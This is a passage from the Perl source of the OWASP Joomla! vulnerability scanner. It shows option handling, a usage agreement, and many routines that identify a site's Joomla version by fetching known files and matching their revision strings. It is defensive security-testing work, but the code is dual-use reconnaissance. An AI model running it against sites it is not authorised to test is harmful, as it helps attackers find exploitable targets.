#!/usr/bin/env perl
#================================================================= 
# OWASP Joomla! Vulnerability Scanner
# (c) 2008-2099 Aung Khant, http://yehg.net/lab
# YGN Ethical Hacker Group, YanGoN, Myanmar
# Update by: Web-Center, http://web-center.si
# DISCLAIMER:
#
# This scanner is intended only for testing your own Joomla web sites.
# The author nor the yehg.net is not responsible for any damages you use this tool.
# Results found using this tool are not guaranteed for accuracies. 
# 
#=================================================================

use warnings;
use strict;
use HTTP::Request::Common;
use LWP::UserAgent;
use Getopt::Std;
use Time::localtime;
use Time::Piece;    
use Switch;
use threads;
use threads::shared;
use Digest::MD5 qw(md5_hex);
use Encode qw(encode_utf8);
use HTML::Entities;
####### [Vars] #######

my(%args,%JOOMSCAN,$start_time,$end_time,$ltime,$today,$now,$urlfile,$txtfile,$outfile,$server_headers);
my($found,$rfifound,$target,$domain_str,$base_url);

my $url:shared = '';
my $admin_dir:shared = '';
my $version:shared = '';
my $exact_version_found:shared = 0;
my $exact_version:shared = '';
my @version_min_range:shared = ();
my @version_max_range:shared = ();
my $biggest_version_min = 0;
my $lowest_version_max = 0;
my $H200bypass = '';

my $J_GENERIC_HOLES = 0;
my $J_CORE_HOLES = 0;
my $J_CORE_MODULES_HOLES = 0;
my $J_3rdParties_HOLES = 0;

my $J_XSS_HOLES = 0;
my $J_SQLin_HOLES = 0;
my $J_FI_HOLES = 0;
my $J_INFO_HOLES = 0;
my $J_DirTr_HOLES = 0;
my $J_OTHER_HOLES = 0;


####### [/Vars] ####### 


getopts("u:p:x:o:r:v:c:s:n:g:", \%args);

$JOOMSCAN{joomdbfile} = 'joomscandb.txt';
$JOOMSCAN{joomdbinfofile} = 'joomscandb-info.txt';
$JOOMSCAN{scanner_update_url} = 'http://yehg.net/lab/pr0js/tools/joomscan.php?'.time();
$JOOMSCAN{scanner_update_note_url} = 'http://yehg.net/lab/pr0js/tools/joomscan.pl-update-note.php?'.time();
$JOOMSCAN{scanner_download_url} = 'http://yehg.net/lab/pr0js/tools/joomscan-latest.zip?'.time();
$JOOMSCAN{db_update_url} = 'http://web-center.si/joomscan/joomscandb.php?'.time();
$JOOMSCAN{db_info_url} = 'http://web-center.si/joomscan/joomscandb-info.php?'.time();
$JOOMSCAN{scanner_version} = '0.0.4';
$JOOMSCAN{author} = reverse('ten.ghey[ta]tnahkgnua ,tnahK gnuA');
$JOOMSCAN{bug_report_email} = 'ten.ghey@nacsmooj';


$start_time = time();
$end_time = 0;
$now = ctime();
$ltime = localtime; $today = $ltime->mdy("/");
if ($0 =~ /:\\/g){$0 = 'joomscan.pl';}

open(JU, $JOOMSCAN{joomdbinfofile}) || die "Can't open $JOOMSCAN{joomdbinfofile} : $!";
my @content = <JU>;
chomp(@content);
my($dbentry,$lastupdate) = @content;
close(JU);

if(($ARGV[0]) && index($ARGV[0],"check") >= 0){check();}
if(($ARGV[0]) && index($ARGV[0],"update") >= 0){update();}
if(($ARGV[0]) && index($ARGV[0],"download") >= 0){download();}
if(($ARGV[0]) && index($ARGV[0],"defense") >= 0){defense();}
if(($ARGV[0]) && index($ARGV[0],"story") >= 0){story();}
if( $#ARGV eq 1 && ($ARGV[0]) && index($ARGV[0],"read") >= 0){doc_read($ARGV[1]);}

####### [Sign Agreement] ######
sub make_agree
{
    print qq{
Welcome to the
OWASP Joomla! Vulnerability Scanner End-User License Agreement!    

[!] Before running the OWASP Joomla! Vulnerability Scanner,
[!] you must agree to the following:
    1. The scanner is to be run only on your own or your clients' sites
    2. The scanner is released free of charge under GPL v3 and
       has no guarantee for its accuracies.
    3. OWASP or the author assumes no responsibilities for
       your illegal misuse.    
    
[!] (y)es or (n)o - };
    my $inp = <STDIN>;
    chomp($inp);
    if($inp eq 'y')
    {
        print qq{
[!] You have signed the EULA of the OWASP Vulnerability Scanner.
    Thank you.

Please wait ...\n"};
        open(AG,'>doc/AGREEMENT')|| die("$!");
        print AG "ATTENTION:\nYou have signed agreement for legal use on the OWASP Vulnerability Scanner.";
        close (AG);        
        sleep(5);
        if ($^O =~ /Win/) {system("cls");}else{system("clear");}  
        
    }else{exit 99;} undef($inp);
}
open(AG,'doc/AGREEMENT') || make_agree();
close(AG);
####### [/Sign Agreement] ######
####### [Force Upgrade] ######
use DirHandle;

my $dir_check = new DirHandle "report/assets";
if (!defined $dir_check)
{
    print qq{
[!] You're updating from version older versions, which is now deprecated.
[!] Use: svn co https://joomscan.svn.sourceforge.net/svnroot/joomscan/trunk joomscan
[!] or download a full package version $JOOMSCAN{scanner_version}
[!] Would you like me to download it? [y/n] };
   my $uans = <STDIN>;
   chomp($uans);
   if($uans eq 'y')
   {
     download();
   }
   else
   {    
     system("mkdir report");
     print "[!] Please find reports under report/ directory.\n"
   }
   undef $uans;
}
else
{   ## free it
    undef $dir_check;
}
####### [/Force Upgrade] ######

# if you're ever lazy to check, uncomment this to autoupdate 
#auto_update();


if (!$args{u}) {usage();}
$url = $args{u};
if ($url !~  /:\/\//){$url = 'http://'.$url;}
if ($url =~  /\/$/){$url = substr($url,0,rindex($url,'/'));}
if ($url =~ /\?/g){$url = substr($url, 0, index($url,'?'));}

$version = '';

$urlfile = $url;
$urlfile =~ s/http:\/\///gi;
$urlfile =~ s/https:\/\///gi;
$urlfile =~ s/\//_/g;
if (length($urlfile)>40){$urlfile = substr($urlfile,0,40).'...';}
$urlfile .= '-joexploit.htm';
$txtfile =  $urlfile;
$urlfile = 'report/'.$urlfile;
$txtfile =~ s/\.htm/\.txt/i;
$txtfile = 'report/'.$txtfile;
$outfile = ($args{o} && $args{o} eq 't')?$txtfile:$urlfile;

my $ua = LWP::UserAgent->new('requests_redirectable'=>['GET','POST']);
my $uagent = 'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3';
my $cookie = '';
my $proxy = '';
if($args{g})
{
    $uagent = $args{g};
}
if($args{c})
{
    $cookie = $args{c};
    $ua->cookie_jar({});
    $ua->default_header('Cookie'=> "$cookie");
}
if($args{x})
{
    $proxy = $args{x};
    if($proxy !~  /:\/\//){$proxy = 'http://'.$proxy;}
    $ua->proxy(['http', 'ftp'],$proxy );
}
$ua->agent($uagent);
$ua->default_header('Referer'=> "http://$url/");
$ua->timeout(30);


### [Fingerprinting KB] ###

sub fprint_generic
{
     lock($version); 
     my $htmlContent = shift;
     if (
        ($htmlContent =~ m/<\/html>\n<!--\s\d{1,30}\s-->/gi) ||
        (check_if_exists("$url".$admin_dir."templates/joomla_admin/images/security.png") =~ /200/g) ||
         (check_if_exists("$url/language/english.xml") =~ /200/g)        
         ||
         ($ua->get("$url/index.php?option=com_h40xr")->content =~ /The\spage\syou\sare trying\sto\saccess\sdoes\snot\sexist/gi)
        )
    {
        $version .= "~Generic version family ....... [1.0.x]\n\n";
    }
    elsif ( ($target->content =~ m/Joomla!\s1.5\s-\sOpen\sSource\sContent\sManagement/gi) ||
           (check_if_exists("$url".$admin_dir."templates/khepri/images/j_login_lock.jpg") =~ /200/g) ||
           (check_if_exists("$url".$admin_dir."templates/khepri/images/j_button1_next.png") =~ /200/g) ||           
           ($ua->get("$url/index.php?option=com_h40xr")->content =~ /404\-\sComponent\snot\s found/gi)           
          )
    {
        $version .= "~Generic version family ....... [1.5.x]\n\n";
    }

}
sub fprint_meta10x
{
    lock($version); lock(@version_min_range);lock(@version_max_range);    
    my $htmlContent = shift;
    if (
        ($htmlContent =~ m/Joomla!\s\-\sCopyright\s\(C\)\s2005\sOpen\sSource\sMatters/gi)
        && ($htmlContent =~ m/<\/html>\n<!--\s\d{1,30}\s-->/gi)	
       )
    {
        $version .= "~1.0.x meta tags revealed [1.0.0 - 1.0.8]\n";
        push @version_min_range, 0;push @version_max_range, 8;
    }    
    elsif (($htmlContent =~ m/Joomla!\s-\sCopyright\s\(C\)\s2005\s\-\s2006\sOpen\sSource\sMatters/gi)
          && ($htmlContent =~ m/<\/html>\n<!--\s\d{1,30}\s-->/gi)	        
        )
    {
        $version .= "~1.0.x meta tags revealed [1.0.9 - 1.0.12]\n";
        push @version_min_range, 9;push @version_max_range, 12;
    }    
    elsif ( ($htmlContent =~ m/Joomla!\s-\sCopyright\s\(C\)\s2005\s\-\s2007\sOpen\sSource\sMatters/gi)
        && ($htmlContent =~ m/<\/html>\n<!--\s\d{1,30}\s-->/gi)	        
        )	   
    {
        $version .= "~1.0.x meta tags revealed [1.0.13 - 1.0.15]\n";
        push @version_min_range, 13;push @version_max_range, 15;
    }
  
    
}
sub fprint_htac10x
{
    lock($version); lock(@version_min_range);lock(@version_max_range); 
    
    my $htac_req = $ua->get("$url/htaccess.txt");
    if ($htac_req->status_line =~ /200/g)
    {
        my $htmlContent = $htac_req->content;
  
        if ($htmlContent =~ m/47\s2005\-09\-15\s02\:55\:27Z\srhuk/gi)        
        {
            $version .= "~1.0.x htaccess.txt revealed [1.0.0 - 1.0.2]\n";
            push @version_min_range, 0;push @version_max_range, 2;
        }    
        elsif ($htmlContent =~ m/423\s2005\-10\-09\s18\:23\:50Z\sstingrey/gi)        
        {
            $version .= "~1.0.x htaccess.txt revealed 1.0.3\n";
            $exact_version_found = 1;$exact_version = '1.0.3';
        }    
        elsif ($htmlContent =~ m/1005\s2005\-11\-13\s17\:33\:59Z\sstingrey/gi)        	   
        {
            $version .= "~1.0.x htaccess.txt revealed [1.0.4 - 1.0.5]\n";
            push @version_min_range, 4;push @version_max_range, 5;
        }
        elsif ($htmlContent =~ m/1570\s2005\-12\-29\s05\:53\:33Z\seddieajau/gi)        	   
        {
            $version .= "~1.0.x htaccess.txt revealed [1.0.6 - 1.0.7]\n";
            push @version_min_range, 6;push @version_max_range, 7;
        }
        elsif ($htmlContent =~ m/2368\s2006\-02\-14\s17\:40\:02Z\sstingrey/gi)        	   
        {
            $version .= "~1.0.x htaccess.txt revealed [1.0.8 - 1.0.9]\n";
            push @version_min_range, 8;push @version_max_range, 9;
        }
        elsif ($htmlContent =~ m/4085\s2006\-06\-21\s16\:03\:54Z\sstingrey/gi)        	   
        {
            $version .= "~1.0.x htaccess.txt revealed 1.0.10\n";
            $exact_version_found = 1;$exact_version = '1.0.10';            
        }
        elsif ($htmlContent =~ m/4756\s2006\-08\-25\s16\:07\:11Z\sstingrey/gi)        	   
        {
            $version .= "~1.0.x htaccess.txt revealed 1.0.11\n";
            $exact_version_found = 1;$exact_version = '1.0.11';
        }
        elsif ($htmlContent =~ m/5973\s2006\-12\-11\s01\:26\:33Z\srobs/gi)        	   
        {
            $version .= "~1.0.x htaccess.txt revealed 1.0.12\n";
            $exact_version_found = 1;$exact_version = '1.0.12';
        }
        elsif ($htmlContent =~ m/5975\s2006\-12\-11\s01\:26\:33Z\srobs/gi)        	   
        {
            $version .= "~1.0.x htaccess.txt revealed [1.0.13 - 1.0.15]\n";
            push @version_min_range, 13;push @version_max_range, 15;
        }
    }    
}
sub fprint_config_dist10x
{
    lock($version); lock(@version_min_range);lock(@version_max_range); 
    
    my $req = $ua->get("$url/configuration.php-dist");
    if ($req->status_line =~ /200/g)
    {
        my $htmlContent = $req->content;
  
        if ($htmlContent =~ m/47\s2005\-09\-15\s02\:55\:27Z\srhuk/gi)        
        {
            $version .= "~1.0.x configuration.php-dist revealed 1.0.0\n";
            $exact_version_found = 1;$exact_version = '1.0.0';
        }    
        elsif ($htmlContent =~ m/217\s2005\-09\-21\s15\:15\:58Z\sstingrey/gi)        
        {
            $version .= "~1.0.x configuration.php-dist revealed [1.0.1 - 1.0.2]\n";
            push @version_min_range, 0;push @version_max_range, 2;
        }    
        elsif ($htmlContent =~ m/506\s2005\-10\-13\s05\:49\:24Z\sstingrey/gi)        
        {
            $version .= "~1.0.x configuration.php-dist revealed [1.0.3 - 1.0.7]\n";
            push @version_min_range, 3;push @version_max_range, 7;
        }
        elsif ($htmlContent =~ m/2622\s2006\-02\-26\s04\:16\:09Z\sstingrey/gi)        
        {
            $version .= "~1.0.x configuration.php-dist revealed 1.0.8\n";
            $exact_version_found = 1;$exact_version = '1.0.0';
        }
        elsif ($htmlContent =~ m/3754\s2006\-05\-31\s12\:08\:37Z\sstingrey/gi)        
        {
            $version .= "~1.0.x configuration.php-dist revealed [1.0.9 - 1.0.10]\n";
            push @version_min_range, 9;push @version_max_range,10;
        }
        elsif ($htmlContent =~ m/4802\s2006\-08\-28\s16\:18\:33Z\sstingrey/gi)        
        {
            $version .= "~1.0.x configuration.php-dist revealed [1.0.11 - 1.0.12]\n";
            push @version_min_range, 11;push @version_max_range, 12;
        }
        elsif ($htmlContent =~ m/7424\s2007\-05\-17\s15\:56\:10Z\srobs/gi)        
        {
            $version .= "~1.0.x configuration.php-dist revealed [1.0.13 - 1.0.15]\n";
            push @version_min_range, 13;push @version_max_range, 15;
        }
        
        
    }    
}

sub fprint_extended_10x
{
    lock($version); lock(@version_min_range);lock(@version_max_range); 
    
    my $req = $ua->get("$url/includes/js/joomla.javascript.js");
    if ($req->status_line =~ /200/g)
    {
        my $htmlContent = $req->content;
        if ($htmlContent =~ m/47\s2005\-09\-15\s02:55:27Z\srhuk/gi)        
        {
            $version .= "~1.0.x joomla.javascript.js revealed 1.0.0\n";
            $exact_version_found = 1;$exact_version = '1.0.0';
        }
        elsif ($htmlContent =~ m/199\s2005\-09\-20\s13:29:10Z\sstingrey/gi)        
        {
            $version .= "~1.0.x joomla.javascript.js revealed [1.0.1 - 1.0.7]\n";
            push @version_min_range, 1;push @version_max_range, 7;
        }         
        elsif ($htmlContent =~ m/2316\s2006\-02\-12\s17:41:33Z\sstingrey/gi)        
        {
            $version .= "~1.0.x joomla.javascript.js revealed 1.0.8\n";
            $exact_version_found = 1;$exact_version = '1.0.8';
        }    
        elsif ($htmlContent =~ m/3562\s2006\-05\-20\s12:27:49Z\sstingrey/gi)        
        {
            $version .= "~1.0.x joomla.javascript.js revealed [1.0.9 - 1.0.11]\n";
            push @version_min_range, 9;push @version_max_range, 11;
        }  
        elsif ($htmlContent =~ m/5689\s2006\-11\-09\s00:55:42Z\sSaka/gi)        
        {
            $version .= "~1.0.x joomla.javascript.js revealed 1.0.12\n";
            $exact_version_found = 1;$exact_version = '1.0.12';
        }
        elsif ($htmlContent =~ m/5691\s2006\-11\-09\s00:55:42Z\sSaka/gi)        
        {
            $version .= "~1.0.x joomla.javascript.js revealed [1.0.13 - 1.0.15]\n";
            push @version_min_range, 13;push @version_max_range, 15;
        }         
    }

    $req = $ua->get("$url/mambots/content/moscode.xml");
    if ($req->status_line =~ /200/g)
    {
        my $htmlContent = $req->content;        
        if ($htmlContent =~ /<license>(.*?)<\/license>/gi)
        {
            $htmlContent = $1;
        }
        else
        {
             return;
        }
   
        if ($htmlContent =~ m/copyleft/gi)        
        {
            $version .= "~1.0.x moscode.xml revealed [1.0.0 - 1.0.13]\n";
            push @version_min_range,0 ;push @version_max_range, 13;
        }    
        elsif ($htmlContent =~ m/licenses/gi)        
        {
            $version .= "~1.0.x moscode.xml revealed [1.0.14 - 1.0.15]\n";
            push @version_min_range, 14;push @version_max_range, 15;
        }  
   
    }
    
    $req = $ua->get("$url/mambots/editors/tinymce.xml");
    if ($req->status_line =~ /200/g)
    {
        my $htmlContent = $req->content;        
   
        if ($htmlContent =~ m/Load\sCSS\sclasses/g)        
        {
            $version .= "~1.0.x tinymce.xml revealed [1.0.0 - 1.0.5]\n";
            push @version_min_range, 0;push @version_max_range, 5;
        }    
        elsif ($htmlContent =~ m/By\sdefault\sthe\sbot/g)        
        {
            $version .= "~1.0.x tinymce.xml revealed [1.0.6 - 1.0.15]\n";
            push @version_min_range, 6;push @version_max_range, 15;
        }  
   
    }    
    
}
sub fprint_htac15x
{
    lock($version); lock(@version_min_range);lock(@version_max_range); 
    
    my $htac_req = $ua->get("$url/htaccess.txt");
    if ($htac_req->status_line =~ /200/g)
    {
        my $htmlContent = $htac_req->content;
  
        if ($htmlContent =~ m/4094\s2006\-06\-21\s18\:35\:46Z\sstingrey/gi)        
        {
            $version .= "~1.5.x htaccess.txt revealed 1.5.0-beta(12-Oct-2006)\n";
            $exact_version_found = 1;$exact_version = '1.5.0-beta(12-Oct-2006)';
        }
        if ($htmlContent =~ m/9795\s2008\-01\-02\s11:33:07Z\srmuilwijk/gi)        
        {
            $version .= "~1.5.x htaccess.txt revealed 1.5.0-stable(21-January-2008)\n";
            $exact_version_found = 1;$exact_version = '1.5.0-stable(21-January-2008)';
        }                
        elsif ($htmlContent =~ m/9975\s2008\-01\-30\s17\:02\:11Z\sircmaxell/gi)        
        {
            $version .= "~1.5.x htaccess.txt revealed [1.5.1 - 1.5.3]\n";
            push @version_min_range, 1;push @version_max_range, 3;
        }    
        elsif ($htmlContent =~ m/10492\s2008\-07\-02\s06\:38\:28Z\sircmaxell/gi)
        {
            $version .= "~1.5.x htaccess.txt revealed [1.5.4 - 1.5.14]\n";
            push @version_min_range, 4;push @version_max_range, 14;
        }
        
    }    
}
sub fprint_config_dist15x
{
    lock($version); lock(@version_min_range);lock(@version_max_range); 
    
    my $req = $ua->get("$url/configuration.php-dist");
    if ($req->status_line =~ /200/g)
    {
        my $htmlContent = $req->content;
  
        if ($htmlContent =~ m/5361\s2006\-10\-07\s19\:21\:08Z\sJinx/gi)        
        {
            $version .= "~1.5.x configuration.php-dist revealed 1.5.0-beta(12-Oct-2006)\n";
            $exact_version_found = 1;$exact_version = '1.5.0-beta';
        }
        if ($htmlContent =~ m/9764\s2007\-12\-30\s07:48:11Z\sircmaxell/gi)        
        {
            $version .= "~1.5.x configuration.php-dist revealed 1.5.0-stable(21-January-2008)\n";
            $exact_version_found = 1;$exact_version = '1.5.0-stable';
        }        
        elsif ($htmlContent =~ m/9991\s2008\-02\-05\s22\:13\:22Z\sircmaxell/gi)        
        {
            $version .= "~1.5.x configuration.php-dist revealed [1.5.1 - 1.5.8]\n";
            push @version_min_range, 1;push @version_max_range, 8;
        }    
        elsif ($htmlContent =~ m/11409\s2009\-01\-10\s02\:27\:08Z\swillebil/gi)        
        {
            $version .= "~1.5.x configuration.php-dist revealed 1.5.9\n";
            $exact_version_found = 1;$exact_version = '1.5.9';
        }
        elsif ($htmlContent =~ m/11687\s2009\-03\-11\s17\:49\:23Z\sian/gi)        
        {
            $version .= "~1.5.x configuration.php-dist revealed [1.5.10 - 1.5.14]\n";
            push @version_min_range, 10;push @version_max_range, 14;
        }        
        
    }    
}

sub fprint_enGBxml_15x
{
    lock($version); lock(@version_min_range);lock(@version_max_range); 
    
    my $req = $ua->get("$url/language/en-GB/en-GB.xml");
    
   if ($req->status_line =~ /200/g)
    {
        my $htmlContent = $req->content;
        if ($htmlContent =~ /<version>(.*?)<\/version>/gi)
        {
            $htmlContent = $1;
        }
        else
        {
             return;
        }
  
        if ($htmlContent =~ m/1\.5\.0/gi)        
        {
            $version .= "~1.5.x en-GB.xml revealed [1.5.0 - 1.5.1]\n";
            push @version_min_range, 0;push @version_max_range, 1;
        }    
        elsif ($htmlContent =~ m/1\.5\.2/gi)        
        {
            $version .= "~1.5.x en-GB.xml revealed [1.5.2 - 1.5.6]\n";
            push @version_min_range, 2;push @version_max_range, 6;
        }    
        elsif ($htmlContent =~ m/1\.5\.7/gi)
        {
            $version .= "~1.5.x en-GB.xml revealed 1.5.7\n";            
            $exact_version_found = 1;$exact_version = '1.5.7';
        }
        elsif ($htmlContent =~ m/1\.5\.8/gi)
        {
            $version .= "~1.5.x en-GB.xml revealed 1.5.8\n";
            $exact_version_found = 1;$exact_version = '1.5.8';
        }
        elsif ($htmlContent =~ m/1\.5\.9/gi)
        {
            $version .= "~1.5.x en-GB.xml revealed [1.5.9 - 1.5.14]\n";
            push @version_min_range, 9;push @version_max_range, 14;
        }
               
    }    
}
sub fprint_enGBini_15x
{
    lock($version); lock(@version_min_range);lock(@version_max_range); 
    
    my $req = $ua->get("$url/language/en-GB/en-GB.ini");
    if ($req->status_line =~ /200/g)
    {
        my $htmlContent = $req->content;
  
        if ($htmlContent =~ m/version\s1\.5\.x\s2005\-10\-30\s14\:10\:00/gi)        
        {
            $version .= "~1.5.x en-GB.ini revealed 1.5.0-beta(12-Oct-2006)\n";
            $exact_version_found = 1;$exact_version = '1.5.0-beta';
        }
        if ($htmlContent =~ m/9913\s2008\-01\-09\s21:28:35Z\sircmaxell/gi)        
        {
            $version .= "~1.5.x en-GB.ini revealed 1.5.0-stable(21-January-2008)\n";
            $exact_version_found = 1;$exact_version = '1.5.0-stable';
        }                
        elsif ($htmlContent =~ m/9990\s2008\-02\-05\s21\:54\:06Z\sian/gi)        
        {
            $version .= "~1.5.x en-GB.ini revealed 1.5.1\n";
            $exact_version_found = 1;$exact_version = '1.5.1';
        }    
        elsif ($htmlContent =~ m/10053\s2008\-02\-21\s18\:57\:54Z\smtk/gi)
        {
            $version .= "~1.5.x en-GB.ini revealed 1.5.2\n";
            $exact_version_found = 1;$exact_version = '1.5.2';
        }
        elsif ($htmlContent =~ m/10208\s2008\-04\-17\s16\:43\:15Z\sircmaxell/gi)        
        {
            $version .= "~1.5.x en-GB.ini revealed 1.5.3\n";
            $exact_version_found = 1;$exact_version = '1.5.3';
        }    
        elsif ($htmlContent =~ m/10498\s2008\-07\-04\s00\:05\:36Z\sian/gi)
        {
            $version .= "~1.5.x en-GB.ini revealed [1.5.4 - 1.5.7]\n";
            push @version_min_range, 4;push @version_max_range, 7;
        }
        elsif ($htmlContent =~ m/11214\s2008\-10\-26\s01\:29\:04Z\sian/gi)
        {
            $version .= "~1.5.x en-GB.ini revealed 1.5.8\n";
            $exact_version_found = 1;$exact_version = '1.5.8';
        }
        elsif ($htmlContent =~ m/11391\s2009\-01\-04\s13\:35\:50Z\sian/gi)        
        {
            ## Wierd about version 1.5.12
            ## They modified the file without svn commit
            if ($htmlContent =~ m/\%Y\-\%M\-\%D=\%Y\-\%m\-\%d/g)
            {
                $version .= "~1.5.x en-GB.ini revealed [1.5.12 - 1.5.14]\n";
                push @version_min_range, 12;push @version_max_range, 14;                
            }
            else
            {
                $version .= "~1.5.x en-GB.ini revealed [1.5.9 - 1.5.11]\n";
                push @version_min_range, 9;push @version_max_range, 11;    
            }
            
        }    
    }    
}

sub fprint_admin_enGBini_15x
{
    lock($version); lock(@version_min_range);lock(@version_max_range); 
    
    my $req = $ua->get("$url".$admin_dir."language/en-GB/en-GB.ini");
    
    if ($req->status_line =~ /200/g)
    {
        my $htmlContent = $req->content;
  
        if ($htmlContent =~ m/2005\-10\-06\s14:45:45/gi)        
        {
            $version .= "~1.5.x admin en-GB.ini revealed 1.5.0-beta(12-Oct-2006)\n";
            $exact_version_found = 1;$exact_version = '1.5.0-beta';
        }
        if ($htmlContent =~ m/9869\s2008\-01\-05\s04:00:13Z\smtk/gi)        
        {
            $version .= "~1.5.x admin en-GB.ini revealed 1.5.0-stable(21-January-2008)\n";
            $exact_version_found = 1;$exact_version = '1.5.0-stable';
        }                
        elsif ($htmlContent =~ m/9990\s2008\-02\-05\s21:54:06Z\sian/gi)        
        {
            $version .= "~1.5.x admin en-GB.ini revealed 1.5.1\n";
            $exact_version_found = 1;$exact_version = '1.5.1';
        }    
        elsif ($htmlContent =~ m/10122\s2008\-03\-10\s11:58:27Z\swillebil/gi)
        {
            $version .= "~1.5.x admin en-GB.ini revealed 1.5.2\n";
            $exact_version_found = 1;$exact_version = '1.5.2';
        }
        elsif ($htmlContent =~ m/10186\s2008\-04\-02\s13:10:12Z\spasamio/gi)        
        {
            $version .= "~1.5.x admin en-GB.ini revealed 1.5.3\n";
            $exact_version_found = 1;$exact_version = '1.5.3';
        }    
        elsif ($htmlContent =~ m/10500\s2008\-07\-04\s06:57:07Z\sircmaxell/gi)
        {
            $version .= "~1.5.x admin en-GB.ini revealed 1.5.4\n";
            $exact_version_found = 1;$exact_version = '1.5.4';
        }
        elsif ($htmlContent =~ m/10571\s2008\-07\-21\s01:27:35Z\spasamio/gi)
        {            
            $version .= "~1.5.x admin en-GB.ini revealed [1.5.5 - 1.5.7]\n";
            push @version_min_range, 5;push @version_max_range, 7;
            
        }
        elsif ($htmlContent =~ m/11213\s2008\-10\-25\s12:43:11Z\spasamio/gi)        
        {
            $version .= "~1.5.x admin en-GB.ini revealed 1.5.8\n";
            $exact_version_found = 1;$exact_version = '1.5.8';
        }
        elsif ($htmlContent =~ m/11391\s2009\-01\-04\s13:35:50Z\sian/gi)        
        {
            $version .= "~1.5.x admin en-GB.ini revealed 1.5.9\n";
            $exact_version_found = 1;$exact_version = '1.5.9';
        }
        elsif ($htmlContent =~ m/11667\s2009\-03\-08\s20:32:38Z\swillebil/gi)        
        {
            $version .= "~1.5.x admin en-GB.ini revealed 1.5.10\n";
            $exact_version_found = 1;$exact_version = '1.5.10';
        }
        elsif ($htmlContent =~ m/11799\s2009\-05\-06\s02:15:50Z\sian/gi)        
        {
            $version .= "~1.5.x admin en-GB.ini revealed 1.5.11\n";
            $exact_version_found = 1;$exact_version = '1.5.11';
        }
        elsif ($htmlContent =~ m/12308\s2009\-06\-23\s04:05:28Z\sian/gi)        
        {
            $version .= "~1.5.x admin en-GB.ini revealed [1.5.12 - 1.5.14]\n";
            push @version_min_range, 12;push @version_max_range, 14;     
        }        
    }    
}

sub fprint_admin_enGBcom_configini_15x
{
    lock($version); lock(@version_min_range);lock(@version_max_range); 
    
    my $req = $ua->get("$url".$admin_dir."language/en-GB/en-GB.com_config.ini");
    if ($req->status_line =~ /200/g)
    {
        my $htmlContent = $req->content;
  
        if ($htmlContent =~ m/version\s1.5.x\s2005\-10\-06\s14:45:45/gi)        
        {
            $version .= "~1.5.x admin en-GB.com_config.ini revealed 1.5.0-beta(12-Oct-2006)\n";
            $exact_version_found = 1;$exact_version = '1.5.0-beta';
        }    
        elsif ($htmlContent =~ m/\s9765\s2007\-12\-30\s08:21:02Z\sircmaxell/gi)        
        {
            $version .= "~1.5.x admin en-GB.com_config.ini revealed [1.5.0(stable) -1.5.1]\n";
            push @version_min_range, 0;push @version_max_range, 1;
        }    
        elsif ($htmlContent =~ m/10129\s2008\-03\-12\s10:45:50Z\sian/gi)
        {
            $version .= "~1.5.x admin en-GB.com_config.ini revealed [1.5.2 - 1.5.3]\n";
            push @version_min_range, 2;push @version_max_range, 3;
        }
 
        elsif ($htmlContent =~ m/10496\s2008\-07\-03\s07:08:39Z\sircmaxell/gi)
        {
            $version .= "~1.5.x admin en-GB.com_config.ini revealed [1.5.4 - 1.5.6]\n";
            push @version_min_range, 4;push @version_max_range, 6;
        }
        elsif ($htmlContent =~ m/10882\s2008\-08\-31\s17:55:14Z\swillebil/gi)
        {
            $version .= "~1.5.x admin en-GB.com_config.ini revealed [1.5.7 - 1.5.8]\n";
            push @version_min_range, 7;push @version_max_range, 8;
        }
        elsif ($htmlContent =~ m/11409\s2009\-01\-10\s02:27:08Z\swillebil\sian/gi)        
        {
            $version .= "~1.5.x admin en-GB.com_config.ini revealed 1.5.9\n";
            $exact_version_found = 1;$exact_version = '1.5.9';
        }
        elsif ($htmlContent =~ m/11687\s2009\-03\-11\s17:49:23Z\sian/gi)        
        {
            $version .= "~1.5.x admin en-GB.com_config.ini revealed 1.5.10\n";
            $exact_version_found = 1;$exact_version = '1.5.10';
        }
        elsif ($htmlContent =~ m/11784\s2009\-04\-24\s17:34:11Z\skdevine/gi)        
        {
            $version .= "~1.5.x admin en-GB.com_config.ini revealed 1.5.11\n";
            $exact_version_found = 1;$exact_version = '1.5.11';
        }
        elsif ($htmlContent =~ m/12308\s2009\-06\-23\s04:05:28Z\sian/gi)        
        {
            $version .= "~1.5.x admin en-GB.com_config.ini revealed [1.5.12 - 1.5.14]\n";
            push @version_min_range, 12;push @version_max_range, 14;                 
        }        
    }    
}

sub fprint_adminlists_html_15x
{
    lock($version); lock(@version_min_range);lock(@version_max_range); 
    
    my $req = $ua->get("$url/libraries/joomla/template/tmpl/adminlists.html");
    if ($req->status_line =~ /200/g)
    {
        my $htmlContent = $req->content;
  
        if ($htmlContent =~ m/5062\s2006\-09\-14\s22:43:19Z\seddiea/gi)        
        {
            $version .= "~1.5.x adminlists.html revealed 1.5.0-beta(12-Oct-2006)\n";
            $exact_version_found = 1;$exact_version = '1.5.0-beta';
        }    
        elsif ($htmlContent =~ m/9765\s2007\-12\-30\s08:21:02Z\sircmaxell/gi)        
        {
            $version .= "~1.5.x adminlists.html revealed [1.5.0(stable) - 1.5.6]\n";
            push @version_min_range, 0;push @version_max_range, 6;
        }    
        elsif ($htmlContent =~ m/10871\s2008\-08\-30\s07:30:33Z\swillebil/gi)
        {
            $version .= "~1.5.x adminlists.html revealed [1.5.7 - 1.5.14]\n";
            push @version_min_range, 7;push @version_max_range, 14;
        }
    }    
}

sub fprint_admin_enGB_com_media_15x
{
    lock($version); lock(@version_min_range);lock(@version_max_range); 
    
    my $htmlContent = get_url_content("$url".$admin_dir."language/en-GB/en-GB.com_media.ini");

    if ($htmlContent =~ m/12540\s2009\-07\-22\s17:34:44Z\sian/i)        
    {
        $version .= "~1.5.x admin enGB com_media revealed [1.5.13 -1.5.14]\n";        
        push @version_min_range, 13;push @version_max_range, 14;
    }    
}

### [/Fingerprinting KB] ###

######### [ROUTINES] #########

sub do_HEAD_request
{
    my $ua = LWP::UserAgent->new('requests_redirectable'=>['GET','POST']);
    $ua->agent($uagent);
    if(defined($proxy) && $proxy ne '')
    {
        if($proxy !~  /:\/\//){$proxy = 'http://'.$proxy;}
        $ua->proxy(['http', 'ftp'],$proxy );                
    }    
    my $u = shift;    
    my $resquest = HEAD "$u";	
    my $response = $ua->request($resquest);
    return $response->status_line;
}
sub check_if_exists
{
    my $u = shift;
    ## $H200bypass is not '', we need to use GET and match
    ## hash or text
    my $c = get_url_content($u);
    if($H200bypass ne "")
    {
        if ($H200bypass =~ /([0-9a-fA-F]{32})/)
        {
